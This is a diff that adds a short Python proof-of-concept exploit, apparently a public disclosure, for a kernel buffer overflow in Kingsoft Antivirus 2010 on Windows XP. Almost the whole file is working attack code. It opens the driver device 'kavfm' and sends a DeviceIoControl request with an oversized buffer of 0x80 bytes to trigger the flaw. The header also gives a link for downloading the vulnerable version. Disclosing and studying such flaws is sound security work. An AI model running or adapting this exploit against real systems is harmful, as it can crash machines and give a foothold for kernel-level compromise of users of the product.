@@ -1,0 +1,33 @@
+#!/usr/bin/python
+
+#################################################################
+#
+# Title: Kingsoft Antivirus Kernel Buffer Overflow Exploit
+# Author: Lufeng Li of Neusoft Corporation
+# Vendor: www.duba.net
+# Platform: Windows XPSP3 Chinese Simplified
+# Tested: Kingsoft Antivirus v2010.04.26.648
+# Vulnerable: Kingsoft Antivirus <=v2010.04.26.648
+# Vulnerable App: http://down10b.zol.com.cn/shadu/KAV100625_DOWN_10_166.zip?key=314e0cb9ea82720d90caae96bb918009
+#################################################################
+# Code :
+from ctypes import *
+
+kernel32 = windll.kernel32
+Psapi    = windll.Psapi
+
+if __name__ == '__main__':
+    GENERIC_READ  = 0x80000000
+    GENERIC_WRITE = 0x40000000
+    OPEN_EXISTING = 0x3
+    CREATE_ALWAYS = 0x2
+
+    DEVICE_NAME   = "\\\\.\\kavfm"
+    dwReturn      = c_ulong()
+    out_size      = 1024
+    in_size       = 1024
+    in_data       = ''
+    driver_handle1 = kernel32.CreateFileA(DEVICE_NAME, GENERIC_READ | GENERIC_WRITE,
+						0, None, CREATE_ALWAYS, 0, None)
+    in_data=1024*'\x80'
+    dev_ioctl = kernel32.DeviceIoControl(driver_handle1, 0x80030004, in_data,500, 0, 0,byref(dwReturn), None)
